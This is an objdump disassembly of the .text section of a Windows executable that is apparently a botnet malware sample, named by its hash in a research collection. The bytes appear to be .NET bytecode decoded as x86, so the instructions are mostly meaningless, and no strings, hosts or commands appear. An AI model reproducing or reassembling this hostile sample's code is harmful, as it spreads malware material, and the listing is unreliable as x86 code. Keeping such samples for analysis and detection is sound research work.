
malware_samples/botnet/9b671e6219a487cfff8202a1372cf92229eb9c372cbf09d6f0822d441a703aca.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	10 d1                	adc    %dl,%cl
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 59 00    	add    %al,0x59f400
  402013:	00 ec                	add    %ch,%ah
  402015:	76 00                	jbe    0x402017
  402017:	00 03                	add    %al,(%ebx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	56                   	push   %esi
  4021d0:	26 00 70 7e          	add    %dh,%es:0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 0a 22 00       	and    $0x220a72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 02                	jb     0x4021f8
  4021f6:	27                   	daa
  4021f7:	00 70 6f             	add    %dh,0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 0a 22 00       	and    $0x220a72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 14                	jb     0x40223a
  402226:	27                   	daa
  402227:	00 70 6f             	add    %dh,0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 14 27 00       	and    $0x271472,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 04             	add    %dh,0x4(%edx)
  4024e4:	22 00                	and    (%eax),%al
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
